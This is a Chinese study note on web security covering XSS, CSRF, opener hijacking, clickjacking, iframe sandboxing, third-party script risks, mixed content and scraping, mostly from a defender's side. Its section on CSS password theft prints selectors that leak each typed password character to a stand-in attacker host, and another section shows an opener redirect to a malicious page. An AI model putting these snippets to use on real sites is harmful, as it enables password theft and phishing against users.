
# 安全问题

> CSP的详细文档<https://cloud.tencent.com/developer/chapter/13541>

## WEB前端

#### 1. xss
- 定义：
    - 反射性：代码不会储存。类似`https://www.weibo?t=${xss的代码}`的链接，当t的值被当做html片段插入文档中xss代码即被执行
    - 存储性：在提交表单数据时，xss代码被保存在数据库，下次在页面上直接输出该部分内容展示时被执行
- 危害：
    - 获取cookie等敏感信息并传输出去
    - 在当前页面加入恶意代码或者直接加载一个外部js，这样可以做很多事情
- 解决办法：
    - 防止被偷cookie：httponly
    - 对于反射性的漏洞，Chrome已经对参数进行过滤了,防止XSS攻击(其实就是内置X-XSS-Protection)
    - 添加响应头：X-XSS-Protection(只可以防御反射型)，其原理是检查url和dom中元素的相关性. 但这并不能完全防止反射型xss. 这里有个可供测试的链接,[XSS Test Page](http://www.enhanceie.com/test/xss/).
        - 开启这个功能后，当浏览器检测到跨站脚本攻击（XSS）时，浏览器将对页面做清理或直接阻止整个页面的加载。
        - IE、Chrome 和 Safari 都内置了这个模块。edge 和火狐没有内置这个模块。
        - 在 IE 上它叫 XSS Filter，在 Chrome 上它叫 XSS Auditor（不过[chrome准备弃用XSS Auditor](https://linux.cn/article-11112-1.html)）。
        - 可以为尚不支持 CSP 的旧版浏览器的用户提供保护
        - 几个用法：
            - X-XSS-Protection : 0，禁用 XSS 过滤这个功能
            - X-XSS-Protection : 1，启用 XSS 过滤，一般浏览器中都是默认开启。如果检测到跨站脚本攻击，浏览器将清除在页面上检测到的不安全的部分
            - X-XSS-Protection : 1; mode=block，如果检测到攻击，浏览器不会像上面的选项一样将不安全的部分删除，而是直接阻止整个页面的加载
            - X-XSS-Protection : 1; report=<reporting-uri>，如果检测到跨站脚本攻击，浏览器会清除在页面上检测到的不安全的部分，并使用report-uri的功能 POST 一个 XSS 警报。这个功能只有在 Chrome 中有效果，在 IE 中无效。
        - 不同看法，有人认为X-XSS-Protection 最差的设置是X-XSS-Protection : 1，因为这可能造成 页面上的代码被误删除，攻击者恰巧可以利用这一漏洞来让页面不可运行。
            - 文章：https://blog.innerht.ml/the-misunderstood-x-xss-protection/，乞丐版翻译：https://www.freebuf.com/articles/web/138769.html
    - csp：控制浏览器能够为指定的页面加载哪些资源https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy
        - 浏览器支持性还可以，IE 6-9，12-13 不支持
        - [配置略复杂]()，看几个例子
            - Content-Security-Policy: default-src https:禁用不安全的内联/动态执行, 只允许通过 https加载这些资源 (images, fonts, scripts, etc.)
            - Content-Security-Policy: default-src 'self': 要所有内容均来自站点的同一个源 (不包括其子域名)
            - Content-Security-Policy: default-src 'self' *.futunn.com:允许内容来自信任的域名及其子域名 (域名不必须与CSP设置所在的域名相同)
            - 更多[示例](https://infosec.mozilla.org/guidelines/web_security#examples-4)
    - 特殊字符输出时转义（因为内容可能在多终端显示，所以建议在后端输出时转义而不是输入时）
        - < 转成 &lt; > 转成 &gt; & 转成 &amp; " 转成 &quot; ' 转成 &#39
        - ? 这里需要搞明白，转义 和 escap 和 encodeURI 、encodeURIComponent的区别

#### 2. csrf
- 定义及危害：
    - 流程：
        - 1.用户在A站点登录后在本域种下登录态cookie
        - 2.访问恶意站点B，恶意站点B的某个页面向站点A发起请求，而这个请求会带上浏览器端所保存的站点A的cookie；
        - 3.站点A根据请求所带的cookie，判断此请求为用户所发送的，站点A会报据用户的权限来处理恶意站点B所发起的请求，以此达成恶意目的。
    - 细节：
        - B站点在发送向A的请求时，可以是通过img等发送一个get请求，也可以通过form表单构造一个post请求
        - 如果通过xhr发送请求(不管是get还是post)，跨域时是默认不会携带cookie的，需要设置xhr.withCredentials = true;
        - 通过img标签，form表单发送请求，默认是携带cookie的
- 防御:
    - 判断Referer
        - Referer字段是无法再前端通过ajax设置header头来改变了的，http协议规定了[这些头](https://fetch.spec.whatwg.org/#forbidden-header-name)不能被修改
    - 登录态通过localstorage保存，因为localstorage 不会默认携带在http请求头中，因此避免了csrf的问题
        - 原理：登录态通过localstorage保存，每次请求时取localstorage中的登录态发送至服务端。由于localstorage没有过期时间，因此还需要自己实现一个具有过期时间的localstorage。
        - 存在的问题：
            - 页面不能发生XSS的攻击，否者登录态直接被泄露
            - localstorage只能在当前域名下被读取，对于主域相同的多个不同域名，不能共享
            - 操作略复杂，不管get/post,多需要手动携带登录态
    - 请求加上token机制
        - session级别的token机制：
            - 访问页面时，在服务端的session中保存一个token，同时将token返回至前端页面html中，常见于通过一个meta标签或者 hidden 的input来保存。
            - 发送请求时，在header或者请求参数中携带该token发送至服务端
            - 服务端在seesion中取出对应的token 同http请求中的token进行对比来确认是否为合法请求
        - cookie级别的token机制：
            - 访问页面时，在服务端随机参数一个token，同时将token返回至前端页面html中，在cookie中也种下该token值
            - 发送请求时，在header或者请求参数中携带该token发送至服务端
            - 服务端在取出cookie中的token同 header或者参数只能的token进行对比来确认是否为合法请求
        - 两种机制的区别：
            - session级别的机制：
                - 由于Session默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次HTTP请求可能会先后落到不同的服务器上，导致后面发起的HTTP请求无法拿到之前的HTTP请求存储在服务器中的Session数据，从而使得Session机制在分布式环境下失效，因此在分布式集群中CSRF Token需要存储在Redis之类的公共存储空间。
                - 使用Session存储，读取和验证CSRF Token会引起比较大的复杂度和性能问题；
            - cookie级别的机制：
                - 只需要对比http请求中的2处token是否一致即可，不会给服务器带来压力。
                - cookie级别的机制完全依赖于cookie，因此需要保证cookie 中的token 不能被前端修改，也不能存在xss漏洞。否者在，XSS攻击的情况下，可以随意在cookie种下一个token并泄露出去，导致这里的token机制失效。
                - 不依赖与session，实施起来成本低、快
                - 在没有设置httponly的前提下：登录态的cookie，默认是回话级别，关闭浏览器才失效，一旦遭遇XSS攻击导致token泄露，在无人工干预的情况下，token会一直有效。而session默认存在有效期，会主动让token失效。
    - 给cookie 加上 SameSite属性: 允许服务器设置某个cookie在跨站请求时不会被发送，从而可以阻止CSRF
        - IE10以前，IE12-15 不支持，QQ浏览器、UC浏览器不支持
        - 几个参数：
            - `Set-Cookie: a=1; Samesite=Strict`:严格模式，cookie 在任何情况下都不可能作为第三方 cookie，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。
            - `Set-Cookie: a=2; Samesite=Lax`:宽松模式，假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个GET请求，则在请求新页面时，会携带对应域名的cookie信息，意思就是不同站点下页面跳转不会有问题。除此之外，异步请求或其他方法的页面跳转都不会携带cookie信息
        - 这种方式需要保证get请求的幂等性，否者`Samesite=Lax`模式下，还是存在get方式的CSRF工具可能
        - 注意点：（[如何判断是否为同一个站点](https://blog.csdn.net/qq_37060233/article/details/86595916)）
            - 当一个请求本身的 URL 和它的发起页面的 URL 不属于同一个站点时，这个请求就算第三方请求。
            - 这里的不同站点的判断并非直接使用的 同域、跨域的概念进行判断，而是使用 Public Suffix List 来判断,为了方便理解，暂时用同域的概率来对应Public Suffix List  判断。
    - 使用restful形式的接口?

#### 3. a标签跳转时 opener.location.href劫持
- 定义：当带有target="_blank"的a标签打开的新标签页面，在新标签页中可以通过`window.opener.location.href = 'https://www.hack.com'`能将原页面跳转到恶意页面
- 解决办法：
    - 1.在 a 标签的 rel 属性中指定 rel="noopener",这种方法IE上基本不支持
    - 2.在 a 标签的 rel 属性中指定 rel="noreferrer",这种方法IE10及以下不支持，同时设置noreferrer，也会导致新页面无法通过document.referrer 获取到源信息。为了更好解决这个劫持漏洞，一般会同时设置rel="noreferrer noopener"。
    - 3. 如果需要照顾老旧浏览器，可以通过js打开页面：`var newTab = window.open(); newTab.opener = null; newTab.location = targetUrl`
- 延伸：rel="noopener" 对性能优化的帮助
    - 官方文档在介绍[a标签的target属性](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/a)时表明，通过 target="_blank"打开新页面时，会在原页面所在的进程中打开新页面，如果新页面在执行耗时js，原页面的性能会受到影响。
    - 通过设置rel="noopener"，可以避免这种性能问题。
    - 原文：`Linking to another page using target="_blank" will run the new page on the same process as your page. If the new page is executing expensive JS, your page's performance may suffer. To avoid this use rel=noopener.`

#### 4. iframe 被恶意嵌套问题
- 定义: 这定义就比较明确了，恶意站点www.hack.com 通过iframe嵌入你的站点www.hehe.com
- 危害:
    - 仍然是点击劫持，恶意站点在iframe上覆盖一个透明的a标签，然后点击引导到恶意站点，用户认为是一个安全的站点跳转过来，因此很可能信任新的页面
    - 收集用户信息，比如在恶意站点旁边或者上层显示登录注册的表单，引导用户在安全站点的账号密码信息
- 解决办法：
    - 1.通过js处理：
        - 方法：js 判断当前页面是否在顶层,如果自己的页面不在顶层，则认为被iframe嵌套引入，做跳转：`(window.top != window.self) && top.location.href = "yuor url"`;
        - 存在的问题：恶意站点在通过iframe嵌入你的站点的时候，可以 让iframe嵌入的站点无法执行js。比如这样`<iframe sandbox="" src="https://www.hehe.com"></iframe>`。sandbox的具体使用见下节。或者 `<iframe sandbox=”allow-forms allow-same-origin allow-scripts”></iframe>`,这样，就可以保证js脚本的执行，但是禁止iframe里的javascript执行top.location.href= "xxx"；

    - 2.通过给页面设置`X-Frame-Options`响应头,来决定站点能被那些站点嵌入。IE8就开始支持了。设置 meta 标签是无效的。
        - 一些配置
            - `X-Frame-Options: deny`：不允许在 frame 中展示，即便外层页面和要嵌入的页面同域
            - `X-Frame-Options: sameorigin`：外层页面如果和要嵌入的页面同域，则可以被嵌入
            - `X-Frame-Options: allow-from https://www.a.com/`：表示运行在那个站点中被作为iframe嵌入，只能支持单域名，并且浏览器对这个`allow-from`的支持不是太好，chrome就不支持。
        - 存在的问题：
            - 1. allow-from支持不太好，且不支持设置多个域名
            - 2. 这是一个非官方标准的响应头，只不过是较早实现，官方建议和CSP一同使用。

    - 3.CSP大法
        -  CSP中的frame-ancestors 指令指定了一个可以包含`<frame>，<iframe>，<object>，<embed>`等元素的有效父级,意思就是设置允许被哪些域进行嵌入
        - IE14之前除了13都不支持`frame-ancestors`,因此需要结合`X-Frame-Options`一起使用。
        - frame-ancestors策略可以设置一个或多个源，而且指定源的时候可以使用通配符，例如`Content-Security-Policy: frame-ancestors http://*.hehe.com`。
        - 几个demo
            - `Content-Security-Policy: frame-ancestors 'none';`其作用类似于X-Frame-Options: DENY
            - `Content-Security-Policy: frame-ancestors 'self';`其作用类似于X-Frame-Options: SAMEORIGIN
            - `Content-Security-Policy: frame-ancestors https://*.futunn.com  https://*.futu5.com;`表示允许被futunn和futu5下的域名进行嵌入

> 普通跨域的情况，iframe 是获取不到 `top.location.href`，但是可以设置`top.location.href`。

#### 5. iframe 沙箱

- 定义：sandbox就是用来给指定iframe设置一个沙盒模型，限制iframe 嵌入页面的权限。（IE10才开始支持）。基本用法就是`<iframe sandbox="xx" src="xxx"></iframe>`
- iframe sandbox几个值的情况
    - ""： 空值，表示启用所有限制，限制如下：
        1. script脚本不能执行
        2. 不能发送ajax请求
        3. 不能使用本地存储，即localStorage,cookie等
        4. 不能创建新的弹窗和window
        5. 不能发送表单
        6. 不能加载额外插件比如flash等
    - allow-forms:允许进行提交表单
    - allow-scripts:运行执行脚本
    - allow-same-origin:允许同域请求,比如ajax,storage
    - allow-top-navigation:允许iframe能够主导window.top进行页面跳转
    - allow-popups:允许iframe中弹出新窗口,比如,window.open,target="_blank"
    - allow-pointer-lock:在iframe中可以锁定鼠标，主要和鼠标锁定有关（没太懂这个含义）

#### 6. 第三方资源js本身存在安全问题
- 定义：
    - 通过cdn加载的第三方js存在 问题代码
    - 通过npm 安装的js组件存在问题代码，或者组件后续升级时，加入了问题代码，基本上作者的npm 或 github账号被盗后，就容易出现这种问题
- 事故案例：
    - [蚂蚁金服 Ant Design](https://www.cnbeta.com/articles/tech/802019.htm) 圣诞节彩蛋事件
    - node 组件[event-stream](http://www.sohu.com/a/278521526_466846) 存在挖矿代码
- 解决办法：这类问题只能代码审查及版本去做约束
    - 1.使用前应该做足够的代码review及审查，没有社区支持、使用热度比较低的不要使用
    - 2.不要通过cdn的方式挂在第三方资源，建议保存在本地项目中在进行挂载
    - 3.对于需要npm install 安装的第三方库，应该明确指定版本或者通过`package-lock.json`锁定一个具体的版本

#### 7. 第三方css偷取密码问题

> [这篇文章](http://blog.minfive.com/2018/02/23/2018-02-23-css-hacker/)讲的相当详细了

- 前提知识：
    - css选择器中存在这一种选择器：`input[type="password"][value$="1"]`,表示会选中 密码输入框中 属性value的值以1结尾的input框
    - 默认情况下，在input中输入什么值，是不会直接反馈到input元素上的，比如input中输入123，html中，input的结构还是`<input type="" />`,不会增加一个value="123" 的属性，要通过document.querySelector('input').value的方式才能获取到值。
    - 有些前端框架，比如react，则会将input的value值，直接写到input的dom结构上，比如input中输入123，html中，input的结构还是`<input type="" value="123" />`，查看<https://www.runoob.com/try/try.php?filename=try_react_form>，打开控制台就能验证。
    - 结合前面的，`input[type="password"][value$="1"] { background-image: url("http://www.hacker.com/1"); }`这段代码的含义就是，给value属性的值以1结尾的input，加上一个背景图。隐含的操作是：当输入框中输入1时，会向http://www.hacker.com/1发送一个请求，告诉该站点，用户输入了一个1。

- 工作流程：
    - 假设页面上加载了一段第三方的css文件:ui.css,css的内容如下，页面的框架是react。
    - 以用户将在input框中输入值为 123456的密码为例.
    - 当用户输入1时，input的结构为`<input type="" value="1" />`,value属性以1结尾,此时背景css生效，将加载http://www.hacker.com/1 这个图片，即发送出去了`http://www.hacker.com/1`的get请求。
    - 用户紧接着输入2，input的结构为`<input type="" value="12" />`,value属性以2结尾,此时背景css生效，将加载http://www.hacker.com/2 这个图片，即发送出去了`http://www.hacker.com/2`的get请求。
    - 以此类推，www.hacker.com站点上将收到 `http://www.hacker.com/1-6`的请求，通过分析access log日志，可以简单的知道用户输入的值为123456。
    - 当然这个过程，本身会复杂的多，比如：如何保证请求有序发送出去，如何处理缓存。但是的确提供了一种窃取思路。

- 防御：
    - 谨慎加载第三方css
    - CSP 大法又来了：`Content-Security-Policy: img-src`指令指定图像和网站图标的有效来源
        - 设置图片只能来至当前页面的源：`Content-Security-Policy: img-src 'self'`
        - 设置图片只能来至指指定站点源：`Content-Security-Policy: img-src https://*.futunn.com https://*.futu5.com`
        - 其他的源会被浏览器拦截，无法进行图片加载

```css
input[type="password"][value$="1"] { background-image: url("http://www.hacker.com/1");
input[type="password"][value$="2"] { background-image: url("http://www.hacker.com/2");
input[type="password"][value$="3"] { background-image: url("http://www.hacker.com/3");
input[type="password"][value$="4"] { background-image: url("http://www.hacker.com/4");
input[type="password"][value$="5"] { background-image: url("http://www.hacker.com/5");
input[type="password"][value$="6"] { background-image: url("http://www.hacker.com/6");
...
/*后面省略value$="各种字符"的css*/
```

#### 8. 302跳转劫持问题

#### 9. cdn劫持



#### 10. 可执行文件上传漏洞

#### 11. http明文传输本身存在问题

**到底如何不安全了？**

从浏览器发起一个http请求，大致会经过如下设备：本机-路由器-运营商服务器-外网路由转发-服务，因为http是明文传输，无论哪一步都能对http报文进行修改，比如加入广告代码、窃取敏感信息，因此http明文传输是不安全的。

**防御措施**

- 无他，无痕升级HTTPS
- 升级HTTPS可能存在的问题：
    - 前端依赖的第三方资源也需要升级为HTTPS协议
    - 在HTTPS页面中引入http的资源会存在`block:mixed-content(混合内容被阻止)`的问题，这是升级过程中最需要注意的问题。
        - `<audio> <img> <video> <object>`这几个标签即便是http的src，仍然可以正常加载和显示
        - 这些标签使用http引入时会被阻止：
            - `<script> (通过src 外链)`，补充：所以jsonp在跨协议的跨域中，是无法解决跨域问题的
            - `<link>(通过href外链)`
            - XMLHttpRequest 发送请求
            - `<iframe> `
            - css文件中，`@font-face, cursor, background-image`等会通过url指定一个图片的情况
            - `<object>`


#### 12. web前端针对 法律法规存在的文案问题
这个不用多说，如果对广告法缺乏基本的认知，很可能出现法律安全方面的问题，比如国家目前是禁止`第一、最大、最全`这类的广告宣传；其次就是当地政策的不了解导致的安全问题，比如将 TW，HK归为国家类，这都是严重错误的情况。技术上无法完全规避这类文案问题，只能不断加强 文案安全合规的的意识。

#### 13. 公开的信息被恶意批量爬取.

- 定义：
    - 简单点说，就是有价值的信息被第三方爬取，用于做数据统计分析、恶意竞争、未经授权获利。
- 危害案例：
    - 最基本的，对web服务器的信息带来大量的资源开销。
    - 信息泄露用于获利：
        - 某券商公司，从竞争对手抓取证券网站上用户的个人信息如昵称，账户id，手机号码，交易活跃程度等，用于骚扰、让利、电话营销等方式引导用户至本平台，以此获利。或者直接通过贩卖个人隐私来获利。
        - 从特定社交网站上，爬取用户信息，如邮箱、电话，用于定向投放广告，比如征婚贴吧里，抓取微信号、手机号，用于投放珍爱网的广告。
- 解决办法：
    - 使用robots.txt，禁止特定网页被抓取，这种方式只对正规搜索引擎有意义，对普通爬虫没有意义。
    - 防止站点被爬取
        - 提高访问门槛：
            - 在产品功能的角度来规避这个问题，比如：抓取时必须提供为正式用户的登录态，没有社交关系中不存在关联的不允许访问。
            - 验证http header的有效性，如：referrer是否正常，useragent是否是浏览器ua，cookie的有无。但非浏览器发起的http请求均可伪造这些字段，这种方式只能提高被爬取的难度，不能根本结局问题。
            - 对IP访问限制频率：同一ip，一段时间内限定访问次数，超过即需要验证码等方式做识别。但是，通过http代理的方式，仍然可以突破这个限制，同样知识提高了爬取难度。
        - 敏感信息前端渲染。
            - 大致过程就是：后端渲染时只渲染占位，前端通过js手动将敏感信息注入到html中，让爬虫无法爬取有效信息。
            - 存在的问题：前端渲染，必然依赖后端提供数据，如：接口，页面数据支出至js变量，依然可以被爬虫利用。所以这种方式只能提高被爬取的难度，同样不能真正解决问题。同时，前端渲染对体验并不友好。
    - 让敏感信息对爬虫不可见

比如有效资源，联系电话：见https://www.dianping.com/shop/57504830


## 后端

- SQL 注入： sqlmap，中国菜刀
- DDos攻击
- DB权限扩散导致的数据泄露风险
- 敏感信息加密程度低存在的可能被撞库问题
- 目录向上遍历漏洞
- 弱口令问题
- 越权问题：只检测登录态是否有效，不检测是否为对应用户的登录态
- 逻辑错误，比如通过手机号就能找回密码
